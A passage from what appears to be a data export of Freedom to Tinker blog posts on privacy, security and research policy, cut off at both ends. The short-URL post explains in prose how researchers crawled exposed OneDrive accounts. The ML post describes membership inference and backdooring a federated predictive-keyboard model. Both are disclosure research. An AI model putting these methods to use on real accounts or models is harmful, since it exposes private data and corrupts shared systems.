potentially single points of failure or vulnerability. Specifically, the same third-party services are often used by a broad array of IoT devices. A security vulnerability in one service might affect devices across a range of manufacturers. Third-party services also allow data aggregation across devices. A third party could aggregate user data from a wide range of devices, creating the possibility for tracking a user’s behavior across many devices. These devices are also not transparent about the Internet services with which they communicate or share data. Most IoT devices do not mention the specific third parties they communicate with in their privacy policies, which makes it difficult for consumers to make purchasing decisions based on security and privacy considerations. Finding #4: Smart Home Device Traffic is Predictable, Facilitating Anomaly Detection The Mirai botnet used hacked IoT devices to conduct distributed denial of service (DDoS) attacks on critical Internet infrastructure. Most owners of these devices had no idea that their security cameras or DVRs were participating in the attack. Figure 2: Test network setup for experiments detecting misbehaving devices. An in-network device or service should be able to automatically detect misbehaving devices and notify users that their devices have been compromised.To evaluate this concept, we have set up a test network to simulate a DDoS attack from a compromised IoT device in a consumer home, as shown in the figure. We are experimenting with machine learning-based DDoS detection using features using IoT-specific network behaviors (e.g., limited number of endpoints and regular time intervals between packets). Preliminary results indicate that home gateway routers or other network middleboxes could automatically detect local IoT device sources of DDoS attacks with high accuracy using low-cost machine learning algorithms."
"164","2018-05-15","2023-03-24","https://freedom-to-tinker.com/2018/05/15/how-to-constructively-review-a-research-paper/","Any piece of research can be evaluated on three axes: Correctness/validity — are the claims justified by evidence? Impact/significance — how will the findings affect the research field (and the world)? Novelty/originality — how big a leap are the ideas, especially the methods, compared to what was already known? There are additional considerations such as the clarity of the presentation and appropriate citations of prior work, but in this post I’ll focus on the three primary criteria above. How should reviewers weigh these three components relative to each other? There’s no single right answer, but I’ll lay out some suggestions. First, note that the three criteria differ greatly in terms of reviewers’ ability to judge them: Correctness can be evaluated at review time, at least in principle. Impact can at best be predicted at review time. In retrospect (say, 10 years after publication), informed peers will probably agree with each other about a paper’s impact. Novelty, in contrast to the other two criteria, seems to be a fundamentally subjective notion. We can all agree that incorrect papers should not be accepted. Peer review would lose its meaning without that requirement. In practice, there are complications ranging from the difficulty of verifying mathematical proofs to the statistical nature of research claims; the latter has led to replication crises in many fields. But as a principle, it’s clear that reviewers shouldn’t compromise on correctness. Should reviewers even care about impact or novelty? It’s less obvious why peer review should uphold standards of (predicted) impact or (perceived) novelty. If papers weren’t filtered for impact, presumably it would burden readers by making it harder to figure out which papers to pay attention to. So peer reviewers perform a service to readers by rejecting low-impact papers, but this type of gatekeeping does collateral damage: many world-changing discoveries were initially rejected as insignificant. The argument for novelty of ideas and methods as a review criterion is different: we want to encourage papers that make contributions beyond their immediate findings, that is, papers that introduce methods that will allow other researchers to make new discoveries in the future. In practice, novelty is often a euphemism for cleverness, which is a perversion of the intent. Readers aren’t served by needlessly clever papers. Who cares about cleverness? People who are evaluating researchers: hiring and promotion committees. Thus, publishing in a venue that emphasizes novelty becomes a badge of merit for researchers to highlight in their CVs. In turn, forums that publish such papers are seen as prestigious. Because of this self-serving aspect, today’s peer review over-emphasizes novelty. Sure, we need occasional breakthroughs, but mostly science progresses in a careful, methodical way, and papers that do this important work are undervalued. In many fields of study, publishing is at risk of devolving into a contest where academics impress each other with their cleverness. There is at least one prominent journal, PLoS One, whose peer reviewers are tasked with checking only correctness, with impact and novelty being left to be sorted out post-publication. But for most journals and peer-reviewed conferences, the limited number of publication slots means that there will inevitably be gatekeeping based on impact and/or novelty. Suggestions for reviewers Given this reality, here are four suggestions for reviewers. This list is far from comprehensive, and narrowly focused on the question of weighing the three criteria. Be explicit about how you rate the paper on correctness, impact, and novelty (and any other factors such as clarity of the writing). Ideally, review forms should insist on separate ratings for the criteria. This makes your review much more actionable for the authors: should they address flaws in the work, try harder to convince the world of its importance, or abandon it entirely? Learn to recognize your own biases in assessing impact and novelty, and accept that these assessments might be wrong or subjective. Be open to a discussion with other reviewers that might change your mind. Not every paper needs to maximize all three criteria. Consider accepting papers with important results even if they aren’t highly novel, and conversely, papers that are judged to be innovative even if the potential impact isn’t immediately clear. But don’t reward cleverness for the sake of cleverness; that’s not what novelty is supposed to be about. Above all, be supportive of authors. If you rated a paper low on impact or novelty, do your best to explain why. Conclusion Over the last 150 years, peer review has evolved to be more and more of a competition. There are some advantages to this model, but it makes it easy for reviewers to lose touch with the purpose of peer review and basic norms of civility. Once in a while, we need to ask ourselves critical questions about what we’re doing and how best to do it. I hope this post was useful for such a reflection. Thanks to Ed Felten and Marshini Chetty for feedback on a draft."
"165","2018-06-29","2023-03-24","https://freedom-to-tinker.com/2018/06/29/against-privacy-defeatism-why-browsers-can-still-stop-fingerprinting/","In this post I’ll discuss how a landmark piece of privacy research was widely misinterpreted, how this misinterpretation deterred the development of privacy technologies rather than spurring it, how a recent paper set the record straight, and what we can learn from all this. The research in question is about browser fingerprinting. Because of differences in operating systems, browser versions, fonts, plugins, and at least a dozen other factors, different users’ web browsers tend to look different. This can be exploited by websites and third-party trackers to create so-called fingerprints. These fingerprints are much more effective than cookies for tracking users across websites: they leave no trace on the device and cannot easily be reset by the user. The question is simply this: how effective is browser fingerprinting? That is, how unique is the typical user’s device fingerprint? The answer has big implications for online privacy. But studying this question scientifically is hard: while there are many tracking companies that have enormous databases of fingerprints, they don’t share them with researchers. The first large-scale experiment on fingerprinting, called Panopticlick, was done by the Electronic Frontier Foundation starting in 2009. Hundreds of thousands of volunteers visited panopticlick.eff.org and agreed to have their browser fingerprinted for research. What the EFF found was remarkable at the time: 83% of participants had a fingerprint that was unique in the sample. Among those with Flash or Java enabled, fingerprints were even more likely to be unique: 94%. A project by researchers at INRIA in France with an even larger sample found broadly similar results. Meanwhile, researchers, including us, found that an ever larger number of browser features — Canvas, Battery, Audio, and WebRTC — were being abused by tracking companies for fingerprinting. The conclusion was clear: fingerprinting is devastatingly effective. It would be futile for web browsers to try to limit fingerprintability by exposing less information to scripts: there were too many leaks to plug; too many fingerprinting vectors. The implications were profound. Browser vendors concluded that they wouldn’t be able to stop third-party tracking, and so privacy protection was left up to extensions. [1] These extensions didn’t aim to limit fingerprintability either. Instead, most of them worked in a convoluted way: by manually compiling block lists of thousands of third-party tracking scripts, constantly playing catch up as new players entered the tracking game. But here’s the twist: a team at INRIA (including some of the same researchers responsible for the earlier study) managed to partner with a major French website and test the website’s visitors for fingerprintability. The findings were published a few months ago, and this time the results were quite different: only a third of users had unique fingerprints (compared to 83% and 94% earlier), despite the researchers’ use of a comprehensive set of 17 fingerprinting attributes. For mobile users the number was even lower: less than a fifth. There were two reasons for the differences: a larger sample in the new study, and because self-selection of participants appears to have introduced a bias in the earlier studies. There’s more: since the web is evolving away from plugins such as Flash and Java, we should expect fingerprintability to drop even further. A close look at the paper’s findings suggests that even simple interventions by browsers to limit the highest-entropy attributes would greatly improve the ability of users to hide in the crowd. Apple recently announced that Safari would try and limit fingerprinting, and it’s likely that the recent paper had an influence in this decision. Notably, a minority of web privacy experts never subscribed to the view that fingerprinting protection is futile, and W3C, the main web standards body, has long provided guidance for developers of new standards on how to minimize fingerprintability. It’s still not too late. But if we’d known in 2009 what we know today, browsers would have had a big head start in developing and deploying fingerprinting defenses. Why did the misinterpretation happen in the first place? One easy lesson is that statistics is hard, and non-representative samples can thoroughly skew research conclusions. But there’s another pill that’s harder to swallow: the recent study was able to test users in the wild only because the researchers didn’t ask or notify the users. [2] With Internet experiments, there is a tension between traditional informed consent and validity of findings, and we need new ethical norms to resolve this. Another lesson is that privacy defenses don’t need to be perfect. Many researchers and engineers think about privacy in all-or-nothing terms: a single mistake can be devastating, and if a defense won’t be perfect, we shouldn’t deploy it at all. That might make sense for some applications such as the Tor browser, but for everyday users of mainstream browsers, the threat model is death by a thousand cuts, and privacy defenses succeed by interfering with the operation of the surveillance economy. Finally, the fingerprinting-defense-is-futile argument is an example of privacy defeatism. Faced with an onslaught of bad news about privacy, we tend to acquire a form of learned helplessness, and reach the simplistic conclusion that privacy is dying and there’s nothing we can do about it. But this position is not supported by historical evidence: instead, we find that there is a constant re-negotiation of the privacy equilibrium, and while there are always privacy-infringing developments, there are offset from time to time by legal, technological, and social defenses. Browser fingerprinting remains on the frontlines of the privacy battle today. The GDPR is making things harder for fingerprinters. It’s time for browser vendors to also get serious in cracking down on this sneaky practice. Thanks to Günes Acar and Steve Englehardt for comments on a draft. [1] One notable exception is the Tor browser, but it comes at a serious cost to performance and breakage of features on websites. Another is Brave, which has a self-selected userbase presumably willing to accept some breakage in exchange for privacy. [2] The researchers limited their experiment to users who had previously consented to the site’s generic cookie notice; they did not specifically inform users about their study."
"166","2018-07-26","2023-03-24","https://freedom-to-tinker.com/2018/07/26/what-are-machine-learning-models-hiding/","Machine learning is eating the world. The abundance of training data has helped ML achieve amazing results for object recognition, natural language processing, predictive analytics, and all manner of other tasks. Much of this training data is very sensitive, including personal photos, search queries, location traces, and health-care records. In a recent series of papers, we uncovered multiple privacy and integrity problems in today’s ML pipelines, especially (1) online services such as Amazon ML and Google Prediction API that create ML models on demand for non-expert users, and (2) federated learning, aka collaborative learning, that lets multiple users create a joint ML model while keeping their data private (imagine millions of smartphones jointly training a predictive keyboard on users’ typed messages). Our Oakland 2017 paper, which has just received the PET Award for Outstanding Research in Privacy Enhancing Technologies, concretely shows how to perform membership inference, i.e., determine if a certain data record was used to train an ML model. Membership inference has a long history in privacy research, especially in genetic privacy and generally whenever statistics about individuals are released. It also has beneficial applications, such as detecting inappropriate uses of personal data. We focus on classifiers, a popular type of ML models. Apps and online services use classifier models to recognize which objects appear in images, categorize consumers based on their purchase patterns, and other similar tasks. We show that if a classifier is open to public access – via an online API or indirectly via an app or service that uses it internally – an adversary can query it and tell from its output if a certain record was used during training. For example, if a classifier based on a patient study is used for predictive health care, membership inference can leak whether or not a certain patient participated in the study. If a (different) classifier categorizes mobile users based on their movement patterns, membership inference can leak which locations were visited by a certain user. There are several technical reasons why ML models are vulnerable to membership inference, including “overfitting” and “memorization” of the training data, but they are a symptom of a bigger problem. Modern ML models, especially deep neural networks, are massive computation and storage systems with millions of high-precision floating-point parameters. They are typically evaluated solely by their test accuracy, i.e., how well they classify the data that they did not train on. Yet they can achieve high test accuracy without using all of their capacity. In addition to asking if a model has learned its task well, we should ask what else has the model learned? What does this “unintended learning” mean for the privacy and integrity of ML models? Deep networks can learn features that are unrelated – even statistically uncorrelated! – to their assigned task. For example, here are the features learned by a binary gender classifier trained on the “Labeled Faces in the Wild” dataset. While the upper layer of this neural network has learned to separate inputs by gender (circles and triangles), the lower layers have also learned to recognize race (red and blue), a property uncorrelated with the task. Our more recent work on property inference attacks shows that even simple binary classifiers trained for generic tasks – for example, determining if a review is positive or negative or if a face is male or female – internally discover fine-grained features that are much more sensitive. This is especially important in collaborative and federated learning, where the internal parameters of each participant’s model are revealed during training, along with periodic updates to these parameters based on the training data. We show that a malicious participant in collaborative training can tell if a certain person appears in another participant’s photos, who has written the reviews used by other participants for training, which types of doctors are being reviewed, and other sensitive information. Notably, this leakage of “extra” information about the training data has no visible effect on the model’s test accuracy. A clever adversary who has access to the ML training software can exploit the unused capacity of ML models for nefarious purposes. In our CCS 2017 paper, we show that a simple modification to the data pre-processing, without changing the training procedure at all, can cause the model to memorize its training data and leak it in response to queries. Consider a binary gender classifier trained in this way. By submitting special inputs to this classifier and observing whether they are classified as male or female, the adversary can reconstruct the actual images on which the classifier was trained (the top row is the ground truth): Federated learning, where models are crowd-sourced from hundreds or even millions of users, is an even juicier target. In a recent paper, we show that a single malicious participant in federated learning can completely replace the joint model with another one that has the same accuracy but also incorporates backdoor functionality. For example, it can intentionally misclassify images with certain features or suggest adversary-chosen words to complete certain sentences. When training ML models, it is not enough to ask if the model has learned its task well. Creators of ML models must ask what else their models have learned. Are they memorizing and leaking their training data? Are they discovering privacy-violating features that have nothing to do with their learning tasks? Are they hiding backdoor functionality? We need least-privilege ML models that learn only what they need for their task – and nothing more. This post is based on joint research with Eugene Bagdasaryan, Luca Melis, Reza Shokri, Congzheng Song, Emiliano de Cristofaro, Deborah Estrin, Yiqing Hua, Thomas Ristenpart, Marco Stronati, and Andreas Veit. Thanks to Arvind Narayanan for feedback on a draft of this post."
"167","2016-04-14","2023-03-24","https://freedom-to-tinker.com/2016/04/14/gone-in-six-characters-short-urls-considered-harmful-for-cloud-services/","[This is a guest post by Vitaly Shmatikov, professor at Cornell Tech and once upon a time my adviser at the University of Texas at Austin. — Arvind Narayanan.] TL;DR: short URLs produced by bit.ly, goo.gl, and similar services are so short that they can be scanned by brute force. Our scan discovered a large number of Microsoft OneDrive accounts with private documents. Many of these accounts are unlocked and allow anyone to inject malware that will be automatically downloaded to users’ devices. We also discovered many driving directions that reveal sensitive information for identifiable individuals, including their visits to specialized medical facilities, prisons, and adult establishments. URL shorteners such as bit.ly and goo.gl perform a straightforward task: they turn long URLs into short ones, consisting of a domain name followed by a 5-, 6-, or 7-character token. This simple convenience feature turns out to have an unintended consequence. The tokens are so short that the entire set of URLs can be scanned by brute force. The actual, long URLs are thus effectively public and can be discovered by anyone with a little patience and a few machines at her disposal. Today, we are releasing our study, 18 months in the making, of what URL shortening means for the security and privacy of cloud services. We did not perform a comprehensive scan of all short URLs (as our analysis shows, such a scan would have been within the capabilities of a more powerful adversary), but we sampled enough to discover interesting information and draw important conclusions. Our study focused on two cloud services that directly integrate URL shortening: Microsoft OneDrive cloud storage (formerly known as SkyDrive) and Google Maps. In both cases, whenever a user wants to share a link to a document, folder, or map with another user, the service offers to generate a short URL – which, as we show, unintentionally makes the original URL public. OneDrive. OneDrive generates short URLs for documents and folders using the 1drv.ms domain. This is a “branded short domain” operated by Bitly and uses the same tokens as bit.ly. Therefore, any scan of bit.ly short URLs automatically discovers 1drv.ms URLs. In our sample scan of 100,000,000 bit.ly URLs with randomly chosen 6-character tokens, 42% resolved to actual URLs. Of those, 19,524 URLs lead to OneDrive/SkyDrive files and folders, most of them live. But this is just the beginning. OneDrive URLs have predictable structure. From the URL to a single shared document (“seed”), one can construct the root URL and automatically traverse the account, discovering all files and folders shared under the same capability as the seed document or without a capability. For example, suppose you obtain a short URL such as http://1drv.ms/1xNOWV7 which resolves to https://onedrive.live.com/?cid=48…48&id=48…48!115&ithint=folder,xlsx&authkey=!A..q4. First parse the URL and extract the cid and authkey parameters. Then, construct the root URL for the account as https://onedrive.live.com/?cid=48…48&authkey=!A...q4. From the root URL, it is easy to automatically discover URLs of other shared files and folders in the account (note: the following traversal methodology no longer works as of March 2016). To find individual files, parse the HTML code of the page and look for a elements with href attributes containing &app=, &v=, /download.aspx?, or /survey?. To find other folders, look for links that start with https://onedrive.live.com/ and contain the account’s cid. The traversal-augmented scan yielded URLs to 227,276 publicly accessible OneDrive documents, including dozens of thousands of PDF and Word files, spreadsheets, media files, and executable binaries. A similar scan of 100,000,000 random 7-character bit.ly tokens yielded URLs to 1,105,146 publicly accessible OneDrive documents. We did not download their contents, but just from the metadata it is obvious that many of them contain private or sensitive information. Around 7% of the OneDrive folders discovered in this fashion allow writing. This means that anyone who randomly scans bit.ly URLs will find thousands of unlocked OneDrive folders and can modify existing files in them or upload arbitrary content, potentially including malware. Microsoft’s virus scanning for OneDrive accounts is trivial to evade (for example, it fails to discover even the test EICAR virus if the attacker goes to the trouble of compressing it). Furthermore, OneDrive “synchronizes” account contents across the user’s OneDrive clients. Therefore, the injected malware will be automatically downloaded to all of the user’s machines and devices running OneDrive. Google Maps. Before September 2015, short goo.gl/maps URLs used 5-character tokens. Our sample random scan of these URLs yielded 23,965,718 live links, of which 10% were for maps with driving directions. These include directions to and from many sensitive locations: clinics for specific diseases (including cancer and mental diseases), addiction treatment centers, abortion providers, correctional and juvenile detention facilities, payday and car-title lenders, gentlemen’s clubs, etc. The endpoints of driving directions often contain enough information (e.g., addresses of single-family residences) to uniquely identify the individuals who requested the directions. For instance, when analyzing one such endpoint, we uncovered the address, full name, and age of a young woman who shared directions to a planned parenthood facility. Conversely, by starting from a residential address and mapping all addresses appearing as the endpoints of the directions to and from the initial address, one can create a map of who visited whom. Fine-grained data associated with individual residential addresses can be used to infer interesting information about the residents. We conjecture that one of the most frequently occurring residential addresses in our sample is the residence of a geocaching enthusiast. He or she shared directions to hundreds of locations around Austin, Texas, as shown in the picture, many of them specified as GPS coordinates. We have been able to find some of these coordinates in a geocaching database. It is also worth mentioning that there is a rich literature on inferring information about individuals from location data. For example, Crandall et al. inferred social ties between people based on their co-occurrence in a geographic location, Isaacman et al. inferred important places in people’s lives from location traces, and Montjoye et al. observed that 95% of individuals can be uniquely identified given only 4 points in a high-resolution location dataset. What happened when we told them. We made several attempts to report the security and privacy risks of short OneDrive URLs to Microsoft’s Security Response Center (MSRC). After an email exchange that lasted over two months, “Brian” informed us on August 1, 2015, that the ability to share documents via short URLs “appears by design” and “does not currently warrant an MSRC case.” As of March of 2016, the URL shortening option is no longer available in the OneDrive interface, and the account traversal methodology described above no longer works. After we contacted MSRC again, they denied that these changes have anything to do with our previous report and reiterated that the issues we discovered do not qualify as a security vulnerability, As of this writing, all previously generated short OneDrive URLs remain vulnerable to scanning and malware injection. We reported the privacy risks of short Google Maps URLs to the Google Security Team. They responded immediately. All newly generated goo.gl/maps URLs have 11- or 12-character tokens, and Google deployed defenses to limit the scanning of the existing URLs. How cloud services should use URL shorteners. Use longer tokens in short URLs. Warn users that shortening a URL may expose the content behind the original URL to unintended third parties. Use your own resolver and tokens, not bit.ly. Detect and limit scanning, and consider techniques such as CAPTCHAs to separate human users from automated scanners. Finally, design better APIs so that leakage of a single URL does not compromise every shared URL in the account."
"168","2018-09-27","2023-03-24","https://freedom-to-tinker.com/2018/09/27/privaci-challenge-context-matters/","by Yan Shvartzshnaider and Marshini Chetty In this post, we describe the Privacy through Contextual Integrity (PrivaCI) challenge that took place as part of the symposium on applications of contextual integrity sponsored by Center for Information Technology Policy and Digital Life Initiative at Princeton University. We summarize the key takeaways from the unfolded discussion. We welcome your feedback on any of the aspects of the challenge, as we seek to improve the challenge to serve as a pedagogical and methodological tool to elicit discussion around privacy in a systematic and structured way. See below the Additional Material and Resources section for links to learning more about the theory of Contextual Integrity and the challenge instruction web page. What Is the PrivaCI Challenge? The PrivaCI challenge is designed for evaluating information technologies and to discuss legitimate responses. It puts into practice the approach formulated by the theory of Contextual Integrity for providing “a rigorous, substantive account of factors determining when people will perceive new information technologies and system as threats to privacy (Nissenbaum, H., 2009).” In the symposium, we used the challenge to discuss and evaluate recent-privacy relevant events. The challenge included 8 teams and 4 contextual scenarios. Each team was presented with a use case/context scenario which then they discussed using the theory of CI. This way each contextual scenario was discussed by a couple of teams. PrivaCI challenge at the symposium on applications of Contextual Integrity To facilitate a structured discussion we asked the group to fill in the following template: Context Scenario: The template included a brief summary of a context scenario which in our case was based on one of the four privacy news related stories with a link to the original story. Contextual Informational Norms and privacy expectations: During the discussion, the teams had to identify the relevant contextual information norms and privacy expectations and provide examples of information flows violating these norms. Example of flows violating the norms: We asked each flow to be broken down into relevant CI Params, i.e., Identify the actors involved (senders, receivers, subjects), Attributes, Transmission Principle. Possible solutions: Finally, the teams were asked to think of possible solutions to the problem which incorporates previous or ongoing research projects of your teammates. What Were The Privacy-Related Scenarios Discussed? We briefly summarize the four case studies/privacy-related scenarios and discuss some of the takeaways here from the group discussions. St. Louis Uber driver has put a video of hundreds of his passengers online without letting them know. https://www.stltoday.com/news/local/metro/st-louis-uber-driver-has-put-video-of-hundreds-of/article_9060fd2f-f683-5321-8c67-ebba5559c753.html “Saint Louis University will put 2,300 Echo Dots in student residences. The school has unveiled plans to provide all 2,300 student residences on campus (both dorms and apartments).” https://www.engadget.com/2018/08/16/saint-louis-university-to-install-2300-echo-dots/ Google tracks your movements even if users set the settings to prevent it. https://apnews.com/828aefab64d4411bac257a07c1af0ecb Facebook asked large U.S. banks to share financial information on their customers. https://www.wsj.com/articles/facebook-to-banks-give-us-your-data-well-give-you-our-users-1533564049 Identifying Governing Norms Much of the discussion focused on the relevant governing norms. For some groups, identifying norms was a relatively straightforward task. For example, in the Uber driver scenario, a group listed: “We do not expect to be filmed in private (?) spaces like Uber/Lyft vehicles.” In the Facebook case, one of the groups articulated a norm as “Financial information should only be shared between financial institutions and individuals, by default, AND Facebook is a social space where personal financial information is not shared.” Other groups, could not always identify norms that were violated. For example, in the same “Google tracks your movements, like it or not” scenario, one of the teams could not formulate what norms were breached. Nevertheless, they felt uncomfortable with the overall notion of being tracked. Similarly, a group analyzing the scenario where “Facebook has asked large U.S. banks to share detailed financial information about their customers” found that the notion of an information flow traversing between social and financial spheres unacceptable. Nevertheless, they were not sure about the governing norms. The unfolded discussion included whether norms usually correspond to “best” practice, due diligence. It might be even possible for Facebook to claim that it is all legal and no laws were breached in the process, but this by itself does not mean there was no violation of a norm. We emphasized the fact that norms are not always grounded in law. An information flow can still violate a norm, despite being specified in a privacy policy or even if it is considered legal, or a “best” practice. Norms are influenced by many other factors. If we feel uneasy about an information flow, it probably violates some deeper norm that we might not be consciously aware of. This requires a deeper analysis. Norms and privacy expectations vary among members of groups and across groups The challenge showcases the norms and privacy expectations may vary. Some members of the group, and across groups, had different privacy expectations for the same context scenario. For example, in the Uber scenario, some members of the group, expected drivers to film their passengers for security purposes, while others did not expect to be filmed at all. In this case, we followed the CI decision heuristic which “recommends assessing [alternative flows’] respective merits as a function of the of their meaning and significance in relation to the aims, purposes, and values of the context.” It was interesting to see how by explaining the values of a “violating” information flows, it was possible to get the members of the team to consider their validity in a certain context under very specific conditions. For example, it might be acceptable for a taxi driver to record their passengers onto a secure server (without Internet access) for safety reasons. Contextual Integrity offers a framework to capture contextual information norms The challenge revealed additional aspects regarding the way groups approach the norm identification task. Two separate teams listed the following statement as norms: “Consistency between presentation of service and actual functioning,” and “Privacy controls actually do something.” These outline general expectations and fall under the deceptive practice of the Federal Trade Commission (FTC) act; nevertheless these expectations are difficult to capture and asses using the CI framework because they do not articulate in terms of appropriate information flows. This also might be a limitation of the task itself, due to time limitation, the groups were asked to articulate the norms in general sentences, rather than specify them using the five CI parameters. Norm violating information flows Once norms were identified, the groups were asked to specify possible information flows that violate them. It was encouraging to see that most teams were able to articulate the violating information flows in a correct manner, i.e., specifying the parameters that correspond to the flow. A team working on the Google’s location tracking scenario could pinpoint the violating information flow: Google should not generate flow without users’ awareness or consent, i.e., the flow can happen under specific conditions. Similar violations identified in other scenarios. For example, in the case, where an Uber driver was streaming live videos of his passengers onto the internet site. Here also the change in transmission principle and the recipient prompted a feeling of privacy violation among the group. Finally, we asked the groups to propose possible solutions to mitigate the problem. Most of the solutions included asking users for permissions, notifying or designing an opt-in only system. The most critical takeaway from the discussion on the fact that norms and users’ privacy expectation evolve as new information flows are introduced, their merits need to be discussed in terms of the functions they serve. Summary The PrivaCI Challenge was a success! It served as an icebreaker for the participants to know each other a little better and also offered a structured way to brainstorm and discuss specific cases. The goal of the challenge exercise was to introduce a systematic way of using the CI framework to evaluate a system in a given scenario. We believe similar challenges can be used as a methodology to introduce and discuss Contextual Integrity in an educational setting or even possibly during the design stage of a product to reveal possible privacy violations. Additional material and resources You can access the challenge description and the template here: http://privaci.info/ci_symposium/challenge The symposium program is available here. To learn more about the theory of Contextual Integrity and how it differs from other existing privacy frameworks we recommend reading “Privacy in Context: Technology, Policy, and the Integrity of Social Life” by Helen Nissenbaum. To participate in the discussion on CI, follow @privaci_way on Twitter. Visit the website: http://privaci.info Join the privaci_research mailing list. References Nissenbaum, H., 2009. Privacy in context: Technology, policy, and the integrity of social life. Stanford University Press."
"169","2018-10-31","2023-03-24","https://freedom-to-tinker.com/2018/10/31/the-third-workshop-on-technology-and-consumer-protection/","Arvind Narayanan and I are pleased to announce that the Workshop on Technology and Consumer Protection (ConPro ’19) will return for a third year! The workshop will once again be co-located with the IEEE Symposium on Security and Privacy, occurring in May 2019. ConPro is a forum for a diverse range of computer science research with consumer protection implications. Last year, papers covered topics ranging from online dating fraud to the readability of security guidance. Panelists and invited speakers explored topics from preventing caller-ID spoofing to protecting unique communities. We see ConPro as a workshop in the classic sense, providing substantive feedback and new ideas. Presentations have sparked suggestions for follow-up work and collaboration opportunities. Attendees represent a wide range of research areas, spurring creative ideas and interesting conversation. For example, comments about crowdworker concerns this year led to discussion of best practices for research making use of those workers. Although our community has grown, we aim to keep discussion and feedback a central part of the workshop. Our friends in the legal community have had some success with larger events focused on feedback and discussion, such as PLSC. We plan to take lessons from those cases. The success of ConPro in past years—amazing research, attendees, discussion, and PCs—makes us excited for next year. The call for papers lists some relevant topics, but if you do computer science research with consumer protection implications, it’s relevant (but be sure those implications are clear). The submission deadline is January 23, 2019. We hope you’ll submit a paper and join us in San Francisco!"
"170","2018-11-28","2023-03-24","https://freedom-to-tinker.com/2018/11/28/citp-call-for-visitors-for-2019-20/","The Center for Information Technology Policy is an interdisciplinary research center at Princeton University that sits at the crossroads of engineering, the social sciences, law, and policy. CITP seeks applicants for various visiting positions each year. Visitors are expected to live in or near Princeton and to be in residence at CITP on a daily basis. They will conduct research and participate actively in CITP’s programs. For all visitors, we are happy to hear from anyone working at the intersection of digital technology and public life, including experts in computer science, sociology, economics, law, political science, public policy, information studies, communication, and other related disciplines. Visitors All visitors must apply online through the links below. There are three job postings for CITP visitors: 1) the Microsoft Visiting Researcher Scholar/Professor of Information Technology Policy, 2) Visiting IT Policy Fellow, and 3) IT Policy Researcher. Microsoft Visiting Research Scholar/Professor of Information Technology Policy The successful applicant must possess a Ph.D. and will be appointed to a ten-month term, beginning September 1st. The visiting professor must teach one course in technology policy per academic year. Preference will be given to current or past professors in related fields and to nationally or internationally recognized experts in technology policy. Full consideration of the Microsoft Visiting Research Scholar/Professor of Information Technology Policy position is given to those who apply by the end of December for the upcoming year. Apply here to become the Microsoft Visiting Research Scholar/Visiting Professor of Information Technology Policy Visiting IT Policy Fellow A Visiting IT Policy Fellow is on leave from a full-time position (for example, a professor on sabbatical). The successful appliant must possess an advance degree and typically will be appointed to a nine-month term, beginning September 1st. Full consideration for the Visiting IT Policy Fellow is given to those who apply by the end of December for the upcoming year. Apply here to become a Visiting IT Policy Fellow IT Policy Researcher An IT Policy Researcher will have Princeton University as the primary affiliation during the visit to CITP (for example, a postdoctoral researcher or a professional visiting for a year between jobs). The successful applicant must possess a Ph.D. or equivalent and typically will be appointed to a 12-month term, beginning September 1st. This year we are also looking for a postdoctoral fellow to work on bias in AI in collaboration with an interdisciplinary team: Arvind Narayanan and Olga Russakovsky at Princeton and Kate Crawford at the AI Now institute NYU. We are interested in developing techniques for recognizing, mitigating and governing bias in computer vision and other modern areas of AI that are are characterized by massive datasets and complex, deep models. If you are interested specifically in this opening, please mention it in your cover letter. Full consideration for the IT Policy Researcher positions is given to those who apply by the end of December for the upcoming year. Apply here to become an IT Policy Researcher Applicants should apply to either the Visiting IT Policy Fellow position (if they will be on leave from a full-time position) or the IT Policy Researcher position (if not), but not both positions; applicants to either position may also apply to be the Microsoft Visiting Research Scholar/Professor if they hold a Ph.D. All applicants should submit a current curriculum vitae, a research plan (including a description of potential courses to be taught if applying for the visiting professor), and a cover letter describing background, interest in the program, and any funding support for the visit. References are not required until finalists are notified. CITP has secured limited resources from a range of sources to support visitors. However, many of our visitors are on paid sabbatical from their own institutions or otherwise provide some or all of their own outside funding. Princeton University is an Equal Opportunity/Affirmative Action Employer and all qualified applicants will receive consideration for employment without regard to age, race, color, religion, sex, sexual orientation, gender identity or expression, national origin, disability status, protected veteran status, or any other characteristic protected by law. All offers and appointments are subject to review and approval by the Dean of the Faculty. If you have any questions about any of these positions or the application process, please feel free to contact us at *protected email*."
"171","2018-12-03","2023-03-24","https://freedom-to-tinker.com/2018/12/03/why-voters-should-mark-ballots-by-hand/","Because voting machines contain computers that can be hacked to make them cheat, “Elections should be conducted with human-readable paper ballots. These may be marked by hand or by machine (using a ballot-marking device); they may be counted by hand or by machine (using an optical scanner). Recounts and audits should be conducted by human inspection of the human-readable portion of the paper ballots.” Ballot-marking devices (BMD) contain computers too, and those can also be hacked to make them cheat. But the principle of voter verifiability is that when the BMD prints out a summary card of the voter’s choices, which the voter can hold in hand before depositing it for scanning and counting, then the voter has verified the printout that can later be recounted by human inspection. ExpressVote ballot card, with bar codes for optical scanner and with human-readable summary of choices for use in voter verification and in recount or audit. But really? As a practical matter, do voters verify their BMD-printed ballot cards, and are they even capable of it? Until now, there hasn’t been much scientific research on that question. A new study by Richard DeMillo, Robert Kadel, and Marilyn Marks now answers that question with hard evidence: In a real polling place, half the voters don’t inspect their ballot cards, and the other half inspect for an average of 3.9 seconds (for a ballot with 18 contests!). When asked, immediately after depositing their ballot, to review an unvoted copy of the ballot they just voted on, most won’t detect that the wrong contests are presented, or that some are missing. This can be seen as a refutation of Ballot-Marking Devices as a concept. Since we cannot trust a BMD to accurately mark the ballot (because it may be hacked), and we cannot trust the voter to accurately review the paper ballot (or even to review it at all), what we can most trust is an optical-scan ballot marked by the voter, with a pen. Although optical-scan ballots aren’t perfect either, that’s the best option we have to ensure that the voter’s choices are accurately recorded on the paper that will be used in a recount or random audit. Here’s how DeMillo et al. measured voter verification. In Gatlinburg, Tennessee they observed a polling place during a primary election in May 2018. There were several BMDs (ExpressVote), where voters produced their ballot card using a touchscreen, and a single optical scanner where voters then deposited their ballot cards. The observers were not close enough to see the voters’ choices, but close enough to see the voter’s behavior. 87 voters were observed, of whom 47% did not look at the ballot card at all before depositing it, and 53% reviewed the card for an average of 3.9 seconds. There were 18 contests on the ballot. Near Chattanooga, Tennessee during an August 2018 primary election, they conducted a kind of “exit poll”, at the required distance of 150 feet from the polling location. The voter was asked to review an unvoted optical-scan sample ballot, and was asked, “Is this the ballot you just voted on?” When the voter was given the correct ballot, 86% recognized as the right ballot, and 14% thought it was different from what they voted. When the voter was given a subtly incorrect ballot (completely different set of candidates either for House of Representatives, for County Commission, or for School Board), 56% wrongly said that this was the ballot they voted, and 44% said there was something wrong. This strongly suggests that it is possible for a hacked BMD to cheat in just one contest (for Congress, perhaps, when there is 